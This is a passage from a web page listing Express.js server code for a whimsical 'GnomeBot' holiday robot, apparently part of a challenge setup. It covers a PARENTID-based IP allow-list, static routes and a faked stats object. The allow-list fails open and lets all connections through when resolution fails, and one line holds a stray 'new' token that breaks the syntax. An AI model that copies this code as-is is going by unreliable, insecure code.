</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">PARENTID</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`PARENTID is set to: </span><span class="si">${</span><span class="nx">PARENTID</span><span class="si">}</span><span class="sb">. Resolving...`</span><span class="p">);</span>
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15"></a><span class="nx">dns</span><span class="p">.</span><span class="nx">lookup</span><span class="p">(</span><span class="nx">PARENTID</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">all</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">addresses</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span>
</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18"></a><span class="w">        </span><span class="sb">`Failed to resolve PARENTID hostname "</span><span class="si">${</span><span class="nx">PARENTID</span><span class="si">}</span><span class="sb">": </span><span class="si">${</span><span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="si">}</span><span class="sb">. Allowing all connections.`</span>
</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">addresses</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">addresses</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21"></a><span class="w">    </span><span class="nx">allowedIps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">addresses</span><span class="p">.</span><span class="nx">map</span><span class="p">((</span><span class="nx">addr</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">addr</span><span class="p">.</span><span class="nx">address</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s2">", "</span><span class="p">);</span>
</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23"></a><span class="w">        </span><span class="sb">`Resolved PARENTID "</span><span class="si">${</span><span class="nx">PARENTID</span><span class="si">}</span><span class="sb">" to IPs: </span><span class="si">${</span><span class="nx">allowedIps</span><span class="si">}</span><span class="sb">. Only these IPs will be allowed.`</span>
</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-26"><a id="__codelineno-10-26" name="__codelineno-10-26"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span>
</span><span id="__span-10-27"><a id="__codelineno-10-27" name="__codelineno-10-27"></a><span class="w">        </span><span class="sb">`PARENTID "</span><span class="si">${</span><span class="nx">PARENTID</span><span class="si">}</span><span class="sb">" resolved, but no IP addresses found. Allowing all connections.`</span>
</span><span id="__span-10-28"><a id="__codelineno-10-28" name="__codelineno-10-28"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-10-29"><a id="__codelineno-10-29" name="__codelineno-10-29"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-10-30"><a id="__codelineno-10-30" name="__codelineno-10-30"></a><span class="p">});</span>
</span><span id="__span-10-31"><a id="__codelineno-10-31" name="__codelineno-10-31"></a><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-32"><a id="__codelineno-10-32" name="__codelineno-10-32"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
</span><span id="__span-10-33"><a id="__codelineno-10-33" name="__codelineno-10-33"></a><span class="w">    </span><span class="s2">"PARENTID environment variable not set. Allowing all connections."</span>
</span><span id="__span-10-34"><a id="__codelineno-10-34" name="__codelineno-10-34"></a><span class="p">);</span>
</span><span id="__span-10-35"><a id="__codelineno-10-35" name="__codelineno-10-35"></a><span class="p">}</span>
</span><span id="__span-10-36"><a id="__codelineno-10-36" name="__codelineno-10-36"></a>
</span><span id="__span-10-37"><a id="__codelineno-10-37" name="__codelineno-10-37"></a><span class="c1">// Middleware</span>
</span><span id="__span-10-38"><a id="__codelineno-10-38" name="__codelineno-10-38"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
</span><span id="__span-10-39"><a id="__codelineno-10-39" name="__codelineno-10-39"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span><span class="w"> </span><span class="nx">extended</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}));</span>
</span><span id="__span-10-40"><a id="__codelineno-10-40" name="__codelineno-10-40"></a>
</span><span id="__span-10-41"><a id="__codelineno-10-41" name="__codelineno-10-41"></a><span class="c1">// --- IP Filtering Middleware ---</span>
</span><span id="__span-10-42"><a id="__codelineno-10-42" name="__codelineno-10-42"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-43"><a id="__codelineno-10-43" name="__codelineno-10-43"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">allowedIps</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">next</span><span class="p">();</span>
</span><span id="__span-10-44"><a id="__codelineno-10-44" name="__codelineno-10-44"></a>
</span><span id="__span-10-45"><a id="__codelineno-10-45" name="__codelineno-10-45"></a><span class="kd">const</span><span class="w"> </span><span class="nx">clientIp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">":"</span><span class="p">).</span><span class="nx">pop</span><span class="p">();</span>
</span><span id="__span-10-46"><a id="__codelineno-10-46" name="__codelineno-10-46"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">allowedIps</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">clientIp</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-47"><a id="__codelineno-10-47" name="__codelineno-10-47"></a><span class="w">    </span><span class="nx">next</span><span class="p">();</span>
</span><span id="__span-10-48"><a id="__codelineno-10-48" name="__codelineno-10-48"></a><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-49"><a id="__codelineno-10-49" name="__codelineno-10-49"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span>
</span><span id="__span-10-50"><a id="__codelineno-10-50" name="__codelineno-10-50"></a><span class="w">    </span><span class="sb">`Rejected connection from </span><span class="si">${</span><span class="nx">clientIp</span><span class="si">}</span><span class="sb"> (does not match PARENTID IPs: </span><span class="si">${</span><span class="nx">allowedIps</span><span class="si">}</span><span class="sb">)`</span>
</span><span id="__span-10-51"><a id="__codelineno-10-51" name="__codelineno-10-51"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-10-52"><a id="__codelineno-10-52" name="__codelineno-10-52"></a><span class="w">    </span><span class="nx">res</span>
</span><span id="__span-10-53"><a id="__codelineno-10-53" name="__codelineno-10-53"></a><span class="w">    </span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">403</span><span class="p">)</span>
</span><span id="__span-10-54"><a id="__codelineno-10-54" name="__codelineno-10-54"></a><span class="w">    </span><span class="p">.</span><span class="nx">send</span><span class="p">(</span>
</span><span id="__span-10-55"><a id="__codelineno-10-55" name="__codelineno-10-55"></a><span class="w">        </span><span class="s2">"Forbidden: Access denied. "</span><span class="w"> </span><span class="o">+</span>
</span><span id="__span-10-56"><a id="__codelineno-10-56" name="__codelineno-10-56"></a><span class="w">        </span><span class="sb">`Rejected connection from </span><span class="si">${</span><span class="nx">clientIp</span><span class="si">}</span><span class="sb"> (does not match PARENTID IPs: </span><span class="si">${</span><span class="nx">allowedIps</span><span class="si">}</span><span class="sb">)`</span>
</span><span id="__span-10-57"><a id="__codelineno-10-57" name="__codelineno-10-57"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-10-58"><a id="__codelineno-10-58" name="__codelineno-10-58"></a><span class="p">}</span>
</span><span id="__span-10-59"><a id="__codelineno-10-59" name="__codelineno-10-59"></a><span class="p">});</span>
</span><span id="__span-10-60"><a id="__codelineno-10-60" name="__codelineno-10-60"></a>
</span><span id="__span-10-61"><a id="__codelineno-10-61" name="__codelineno-10-61"></a><span class="c1">// --- Serve Static Files ---</span>
</span><span id="__span-10-62"><a id="__codelineno-10-62" name="__codelineno-10-62"></a><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">"/static"</span><span class="p">,</span><span class="w"> </span><span class="nx">express</span><span class="p">.</span><span class="k">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span><span class="w"> </span><span class="s2">"static"</span><span class="p">)));</span>
</span><span id="__span-10-63"><a id="__codelineno-10-63" name="__codelineno-10-63"></a><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s2">"view engine"</span><span class="p">,</span><span class="w"> </span><span class="s2">"ejs"</span><span class="p">);</span>
</span><span id="__span-10-64"><a id="__codelineno-10-64" name="__codelineno-10-64"></a>
</span><span id="__span-10-65"><a id="__codelineno-10-65" name="__codelineno-10-65"></a><span class="c1">// --- Game Constants ---</span>
</span><span id="__span-10-66"><a id="__codelineno-10-66" name="__codelineno-10-66"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gnomebotname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"GnomeBot"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">99999</span><span class="p">);</span>
</span><span id="__span-10-67"><a id="__codelineno-10-67" name="__codelineno-10-67"></a><span class="kd">const</span><span class="w"> </span><span class="nx">containerUsername</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">USERNAME</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"Unknown"</span><span class="p">;</span>
</span><span id="__span-10-68"><a id="__codelineno-10-68" name="__codelineno-10-68"></a><span class="kd">const</span><span class="w"> </span><span class="nx">processStartTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
</span><span id="__span-10-69"><a id="__codelineno-10-69" name="__codelineno-10-69"></a>
</span><span id="__span-10-70"><a id="__codelineno-10-70" name="__codelineno-10-70"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gnomeBotObjectDetails</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-71"><a id="__codelineno-10-71" name="__codelineno-10-71"></a><span class="nx">settings</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-72"><a id="__codelineno-10-72" name="__codelineno-10-72"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="nx">gnomebotname</span><span class="p">,</span>
</span><span id="__span-10-73"><a id="__codelineno-10-73" name="__codelineno-10-73"></a><span class="w">    </span><span class="nx">model_version</span><span class="o">:</span><span class="w"> </span><span class="s2">"2.3.8"</span><span class="p">,</span>
</span><span id="__span-10-74"><a id="__codelineno-10-74" name="__codelineno-10-74"></a><span class="w">    </span><span class="nx">firmware_version</span><span class="o">:</span><span class="w"> </span><span class="s2">"GNM-4.12.0"</span><span class="p">,</span>
</span><span id="__span-10-75"><a id="__codelineno-10-75" name="__codelineno-10-75"></a><span class="p">},</span>
</span><span id="__span-10-76"><a id="__codelineno-10-76" name="__codelineno-10-76"></a><span class="p">};</span>
</span><span id="__span-10-77"><a id="__codelineno-10-77" name="__codelineno-10-77"></a>
</span><span id="__span-10-78"><a id="__codelineno-10-78" name="__codelineno-10-78"></a><span class="c1">// Routes</span>
</span><span id="__span-10-79"><a id="__codelineno-10-79" name="__codelineno-10-79"></a><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/home"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-80"><a id="__codelineno-10-80" name="__codelineno-10-80"></a><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span><span class="w"> </span><span class="s2">"text/html"</span><span class="p">);</span>
</span><span id="__span-10-81"><a id="__codelineno-10-81" name="__codelineno-10-81"></a><span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span><span class="w"> </span><span class="s2">"views"</span><span class="p">,</span><span class="w"> </span><span class="s2">"home.ejs"</span><span class="p">));</span>
</span><span id="__span-10-82"><a id="__codelineno-10-82" name="__codelineno-10-82"></a><span class="p">});</span>
</span><span id="__span-10-83"><a id="__codelineno-10-83" name="__codelineno-10-83"></a>
</span><span id="__span-10-84"><a id="__codelineno-10-84" name="__codelineno-10-84"></a><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/control"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-85"><a id="__codelineno-10-85" name="__codelineno-10-85"></a><span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span><span class="w"> </span><span class="s2">"text/html"</span><span class="p">);</span>
</span><span id="__span-10-86"><a id="__codelineno-10-86" name="__codelineno-10-86"></a><span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span><span class="w"> </span><span class="s2">"views"</span><span class="p">,</span><span class="w"> </span><span class="s2">"control.ejs"</span><span class="p">));</span>
</span><span id="__span-10-87"><a id="__codelineno-10-87" name="__codelineno-10-87"></a><span class="p">});</span>
</span><span id="__span-10-88"><a id="__codelineno-10-88" name="__codelineno-10-88"></a>
</span><span id="__span-10-89"><a id="__codelineno-10-89" name="__codelineno-10-89"></a><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/stats"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-90"><a id="__codelineno-10-90" name="__codelineno-10-90"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Rendering stats view"</span><span class="p">);</span>
</span><span id="__span-10-91"><a id="__codelineno-10-91" name="__codelineno-10-91"></a>
</span><span id="__span-10-92"><a id="__codelineno-10-92" name="__codelineno-10-92"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gnomeStats</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
</span><span id="__span-10-93"><a id="__codelineno-10-93" name="__codelineno-10-93"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-94"><a id="__codelineno-10-94" name="__codelineno-10-94"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"name"</span><span class="p">,</span>
</span><span id="__span-10-95"><a id="__codelineno-10-95" name="__codelineno-10-95"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">gnomeBotObjectDetails</span><span class="o">?</span><span class="p">.</span><span class="nx">settings</span><span class="o">?</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">gnomebotname</span><span class="p">,</span>
</span><span id="__span-10-96"><a id="__codelineno-10-96" name="__codelineno-10-96"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-10-97"><a id="__codelineno-10-97" name="__codelineno-10-97"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-98"><a id="__codelineno-10-98" name="__codelineno-10-98"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"model_version"</span><span class="p">,</span>
</span><span id="__span-10-99"><a id="__codelineno-10-99" name="__codelineno-10-99"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">gnomeBotObjectDetails</span><span class="o">?</span><span class="p">.</span><span class="nx">settings</span><span class="o">?</span><span class="p">.</span><span class="nx">model_version</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"Unknown"</span><span class="p">,</span>
</span><span id="__span-10-100"><a id="__codelineno-10-100" name="__codelineno-10-100"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-10-101"><a id="__codelineno-10-101" name="__codelineno-10-101"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-102"><a id="__codelineno-10-102" name="__codelineno-10-102"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"description"</span><span class="p">,</span>
</span><span id="__span-10-103"><a id="__codelineno-10-103" name="__codelineno-10-103"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="s2">"Holiday remote controlled gnome for your home."</span><span class="p">,</span>
</span><span id="__span-10-104"><a id="__codelineno-10-104" name="__codelineno-10-104"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-10-105"><a id="__codelineno-10-105" name="__codelineno-10-105"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"status"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="s2">"active"</span><span class="w"> </span><span class="p">},</span>
</span><span id="__span-10-106"><a id="__codelineno-10-106" name="__codelineno-10-106"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"last_updated"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">()</span><span class="w"> </span><span class="p">},</span><span class="ow">new</span>
</span><span id="__span-10-107"><a id="__codelineno-10-107" name="__codelineno-10-107"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"last_updated_by"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">containerUsername</span><span class="w"> </span><span class="p">},</span>
</span><span id="__span-10-108"><a id="__codelineno-10-108" name="__codelineno-10-108"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"last_accessed_by"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">containerUsername</span><span class="w"> </span><span class="p">},</span>
</span><span id="__span-10-109"><a id="__codelineno-10-109" name="__codelineno-10-109"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-110"><a id="__codelineno-10-110" name="__codelineno-10-110"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"battery_level"</span><span class="p">,</span>
</span><span id="__span-10-111"><a id="__codelineno-10-111" name="__codelineno-10-111"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span>
</span><span id="__span-10-112"><a id="__codelineno-10-112" name="__codelineno-10-112"></a><span class="w">        </span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span>
</span><span id="__span-10-113"><a id="__codelineno-10-113" name="__codelineno-10-113"></a><span class="w">        </span><span class="mf">0</span><span class="p">,</span>
</span><span id="__span-10-114"><a id="__codelineno-10-114" name="__codelineno-10-114"></a><span class="w">        </span><span class="mf">100</span><span class="w"> </span><span class="o">-</span>
</span><span id="__span-10-115"><a id="__codelineno-10-115" name="__codelineno-10-115"></a><span class="w">            </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span>
</span><span id="__span-10-116"><a id="__codelineno-10-116" name="__codelineno-10-116"></a><span class="w">            </span><span class="p">((</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">processStartTime</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="p">(</span><span class="mf">2</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">100</span>
</span><span id="__span-10-117"><a id="__codelineno-10-117" name="__codelineno-10-117"></a><span class="w">            </span><span class="p">)</span>
</span><span id="__span-10-118"><a id="__codelineno-10-118" name="__codelineno-10-118"></a><span class="w">        </span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"%"</span><span class="p">,</span>
</span><span id="__span-10-119"><a id="__codelineno-10-119" name="__codelineno-10-119"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-10-120"><a id="__codelineno-10-120" name="__codelineno-10-120"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-121"><a id="__codelineno-10-121" name="__codelineno-10-121"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"uptime"</span><span class="p">,</span>
</span><span id="__span-10-122"><a id="__codelineno-10-122" name="__codelineno-10-122"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">((</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">processStartTime</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">" seconds"</span><span class="p">,</span>
</span><span id="__span-10-123"><a id="__codelineno-10-123" name="__codelineno-10-123"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-10-124"><a id="__codelineno-10-124" name="__codelineno-10-124"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-125"><a id="__codelineno-10-125" name="__codelineno-10-125"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"cpu_temperature"</span><span class="p">,</span>
</span><span id="__span-10-126"><a id="__codelineno-10-126" name="__codelineno-10-126"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">30</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">40</span><span class="p">).</span><span class="nx">toFixed</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"°C"</span><span class="p">,</span>
</span><span id="__span-10-127"><a id="__codelineno-10-127" name="__codelineno-10-127"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-10-128"><a id="__codelineno-10-128" name="__codelineno-10-128"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"current_task"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="s2">"Idle"</span><span class="w"> </span><span class="p">},</span>
</span><span id="__span-10-129"><a id="__codelineno-10-129" name="__codelineno-10-129"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"network_status"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="s2">"Connected"</span><span class="w"> </span><span class="p">},</span>
</span><span id="__span-10-130"><a id="__codelineno-10-130" name="__codelineno-10-130"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"error_logs"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="s2">"None"</span><span class="w"> </span><span class="p">},</span>
</span><span id="__span-10-131"><a id="__codelineno-10-131" name="__codelineno-10-131"></a><span class="w">    </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"gnome_mode"</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="s2">"Stealth"</span><span class="w"> </span><span class="p">},</span>
</span><span id="__span-10-132"><a id="__codelineno-10-132" name="__codelineno-10-132"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-133"><a id="__codelineno-10-133" name="__codelineno-10-133"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"firmware_version"</span><span class="p">,</span>
</span><span id="__span-10-134"><a id="__codelineno-10-134" name="__codelineno-10-134"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">gnomeBotObjectDetails</span><span class="o">?</span><span class="p">.</span><span class="nx">settings</span><span class="o">?</span><span class="p">.</span><span class="nx">firmware_version</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"Unknown"</span><span class="p">,</span>
</span><span id="__span-10-135"><a id="__codelineno-10-135" name="__codelineno-10-135"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-10-136"><a id="__codelineno-10-136" name="__codelineno-10-136"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-10-137"><a id="__codelineno-10-137" name="__codelineno-10-137"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"gnome_mood"</span><span class="p">,</span>
</span><span id="__span-10-138"><a id="__codelineno-10-138" name="__codelineno-10-138"></a><span class="w">    </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"Happy"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Grumpy"</span><span class="p">,</span><span class="w"> </span><span class="s2">"Mischievous"</span><span class="p">][</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">3</span><span class="p">)],</span>
</span><span id="__span-10-139"><a id="__codelineno-10-139" name="__codelineno-10-139"></a><span class="w">    </span><span class="p">},</span>
